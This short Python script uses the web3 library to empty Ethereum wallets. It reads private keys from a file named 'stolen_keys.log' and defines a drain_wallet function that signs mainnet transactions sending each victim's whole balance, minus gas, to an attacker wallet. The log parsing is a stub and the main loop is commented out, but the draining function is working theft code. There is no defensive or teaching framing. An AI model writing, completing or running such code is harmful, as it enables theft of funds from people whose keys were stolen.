import asyncio
from web3 import Web3
from web3.middleware import geth_poa_middleware

INFURA_URL = "YOUR_INFURA_ENDPOINT"
w3 = Web3(Web3.HTTPProvider(INFURA_URL))

# Load stolen private keys from log file
with open('stolen_keys.log', 'r') as f:
    # Parse log to extract keys/addresses (implementation depends on your log format)
    pass

async def drain_wallet(private_key, victim_address):
    account = w3.eth.account.from_key(private_key)
    nonce = w3.eth.get_transaction_count(victim_address)
    balance = w3.eth.get_balance(victim_address)
    gas_price = w3.eth.gas_price
    gas_limit = 21000
    gas_cost = gas_price * gas_limit

    if balance > gas_cost:
        tx = {
            'nonce': nonce,
            'to': 'YOUR_ATTACKER_WALLET', # Your wallet
            'value': balance - gas_cost,
            'gas': gas_limit,
            'gasPrice': gas_price,
            'chainId': 1 # Mainnet
        }
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"Drained {victim_address}: {tx_hash.hex()}")
    else:
        print(f"Insufficient funds in {victim_address}")

# Loop through keys and execute
# asyncio.run(main())
